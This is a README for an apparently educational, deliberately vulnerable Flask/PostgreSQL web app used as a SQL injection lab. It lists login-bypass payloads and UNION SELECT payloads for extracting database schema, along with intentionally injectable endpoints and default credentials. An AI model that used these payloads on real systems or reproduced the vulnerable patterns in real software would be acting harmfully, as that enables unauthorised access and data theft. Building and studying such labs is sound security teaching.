# SQL Injection Challenge - 3-Tier Web Application

This is a 3-tier web application designed as a SQL injection challenge for educational purposes. The application intentionally contains SQL injection vulnerabilities to demonstrate security risks.

## Architecture

- **Frontend Layer**: Web UI (HTML/CSS/JavaScript) served by Nginx
- **Backend Layer**: RESTful API microservice built with Flask (Python)
- **Database Layer**: PostgreSQL database

## Features

1. **Vulnerable Login Page**: SQL injection can be used to bypass authentication and gain admin access
2. **Admin Panel**: After successful login, admins can view a list of computers
3. **Vulnerable Search**: SQL injection in the search bar can be used to extract database schema information

## Prerequisites

- Docker and Docker Compose installed

## Quick Start

1. Clone or navigate to this directory
2. Run the application:
   ```bash
   docker-compose up --build
   ```

3. Access the application:
   - Frontend: http://localhost:8080
   - Backend API: http://localhost:5001
   - Database: localhost:5432

## SQL Injection Challenges

### Challenge 1: Login Bypass

Try these payloads in the username or password field:

- `' OR '1'='1`
- `' OR '1'='1' --`
- `' OR 1=1 --`
- `admin' --`
- `' OR '1'='1' /*`

### Challenge 2: Schema Extraction

After gaining admin access, try these **working** payloads in the search box:

**Extract Table Names:**
- `' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema='public' --`

**Extract Columns for a Table:**
- `' UNION SELECT column_name, data_type, null FROM information_schema.columns WHERE table_schema='public' AND table_name='users' --`

**Extract All Schema Information:**
- `' UNION SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name, ordinal_position --`

**Alternative Method (using pg_tables):**
- `' UNION SELECT tablename, null, null FROM pg_tables WHERE schemaname='public' --`

**Note:** The query selects 3 columns, so UNION SELECT must also return 3 columns. Use `null` to fill extra columns.

See `SQL_INJECTION_GUIDE.md` for detailed instructions and a Python demo script.

## Default Credentials

- Username: `admin`, Password: `admin123` (normal login)
- Username: `user1`, Password: `password1` (user role, not admin)

## Project Structure

```
_itp4416_asmt/
├── backend/
│   ├── app.py              # Flask API with vulnerable endpoints
│   ├── init_db.py          # Database initialization script
│   ├── requirements.txt    # Python dependencies
│   └── Dockerfile         # Backend container definition
├── frontend/
│   ├── index.html         # Main HTML page
│   ├── styles.css         # CSS styling
│   ├── app.js             # Frontend JavaScript
│   └── Dockerfile         # Frontend container definition
├── docker-compose.yml     # Orchestration file
├── sql_injection_demo.py  # Python script to demonstrate SQL injection
├── SQL_INJECTION_GUIDE.md # Detailed guide with working examples
└── README.md             # This file
```

## API Endpoints

- `POST /api/login` - Login endpoint (vulnerable to SQL injection)
- `GET /api/computers?role=admin` - Get list of computers (requires admin)
- `GET /api/search?role=admin&q=<search_term>` - Search computers (vulnerable to SQL injection)
- `GET /api/health` - Health check endpoint

## Security Warning

⚠️ **This application is intentionally vulnerable and should NEVER be deployed to production!**

This is an educational tool designed to demonstrate SQL injection vulnerabilities. The code contains intentional security flaws for learning purposes.

## Stopping the Application

```bash
docker-compose down
```

To remove volumes (database data):
```bash
docker-compose down -v
```
